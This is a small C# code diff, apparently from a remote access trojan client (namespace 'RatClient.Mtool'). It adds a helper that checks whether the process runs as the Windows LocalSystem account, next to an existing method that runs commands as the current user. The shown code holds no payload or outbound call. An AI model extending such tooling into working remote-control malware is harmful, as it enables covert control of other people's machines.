@@ -8,6 +8,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using RatClient.Mtool;
 using System.Management;
+using System.Security.Principal;
 
 
 
@@ -19,6 +20,11 @@ public class Tools
         return Process.GetProcessesByName(name.Replace(".exe", ""))[0].Id;
     }
 
+    public static bool imSystemUser()
+    {
+        WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
+        return currentUser.User.Value.Equals("S-1-5-18", StringComparison.OrdinalIgnoreCase);
+    }
 
     public static byte[] RunAsCurrentUser(string process, string command)
     {
